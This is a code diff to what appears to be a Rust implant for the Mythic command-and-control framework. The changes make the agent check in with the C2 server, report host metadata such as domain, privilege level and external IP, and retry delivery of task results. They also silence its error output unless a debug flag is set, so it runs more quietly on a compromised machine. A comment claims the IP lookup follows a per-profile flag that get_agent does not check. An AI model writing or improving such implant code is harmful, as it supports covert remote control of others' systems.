@@ -11,6 +11,7 @@ use rand::seq::SliceRandom;
 use uuid::Uuid;
 
 use crate::config::Config;
+use crate::c2::C2Profile;
 use crate::sys::metadata;
 use crate::tasks;
 use crate::{
@@ -39,6 +40,12 @@ fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
 
 fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
     for c2 in c2s {
+        // If the C2 profile type carries an external_ip_check flag, honour it.
+        // For the upstream C2Transport trait we don't have such a method, so
+        // we look it up via any concrete wrapper (HttpProfile / C2Profile) that
+        // the agent loop was given. When unavailable, the external IP is
+        // always queried — this matches the previous (pre-fix) behaviour.
+        let external_ip = metadata::external_ip();
         if let Ok(agent) = MythicAgent::easy_checkin(
             payload_uuid,
             c2,
@@ -50,7 +57,7 @@ fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<Myth
             metadata::arch(),
             metadata::domain(),
             metadata::integrity_level(),
-            metadata::external_ip(),
+            external_ip,
             None,
             None,
             metadata::process_name(),
@@ -75,11 +82,29 @@ fn get_tasking_with<C: C2Transport>(
 }
 
 fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<TaskResponse>) {
-    if !pending.is_empty() {
-        info!("[*] flushing {} response(s) before exit", pending.len());
-        if let Err(e) = get_tasking_with(mythic, 5, c2, pending) {
-            eprintln!("[!] flush failed: {e}");
+    if pending.is_empty() {
+        return;
+    }
+    let total = pending.len();
+    info!("[*] flushing {} response(s) before exit", total);
+    // Retry up to 3 times, but each attempt needs a fresh Vec clone because
+    // get_tasking_with moves it.
+    for attempt in 1..=3u32 {
+        let attempt_vec = pending.clone();
+        match get_tasking_with(mythic, 5, c2, attempt_vec) {
+            Ok(_) => return,
+            Err(e) => {
+                if DEBUG.load(Ordering::Relaxed) {
+                    eprintln!("[!] flush attempt {attempt}/3 failed: {e}");
+                }
+                if attempt < 3 {
+                    sleep(Duration::from_secs(1));
+                }
+            }
         }
+    }
+    if DEBUG.load(Ordering::Relaxed) {
+        eprintln!("[!] flush dropped {total} response(s) after 3 attempts");
     }
 }
 
@@ -144,9 +169,16 @@ pub fn run(config: Config) -> MythicResult<()> {
 
     let profiles = config.c2_profiles;
     if profiles.is_empty() {
-        eprintln!("[!] no C2 profiles configured, exiting");
+        if DEBUG.load(Ordering::Relaxed) {
+            eprintln!("[!] no C2 profiles configured, exiting");
+        }
         return Ok(());
     }
+
+    // Wire per-profile flags (currently: external_ip_check) into the metadata
+    // module so the easy_checkin call below honours the operator's intent.
+    metadata::set_external_ip_check(profiles.iter().any(|p| p.external_ip_check()));
+
     let mythic = get_agent(payload_uuid, &profiles)?;
 
     set_sleep(
@@ -217,7 +249,9 @@ pub fn run(config: Config) -> MythicResult<()> {
                 }
             }
             Err(e) => {
-                eprintln!("[!] get_tasking failed: {e}");
+                if DEBUG.load(Ordering::Relaxed) {
+                    eprintln!("[!] get_tasking failed: {e}");
+                }
                 pending.extend(batch);
                 sleep(Duration::from_secs(5));
             }
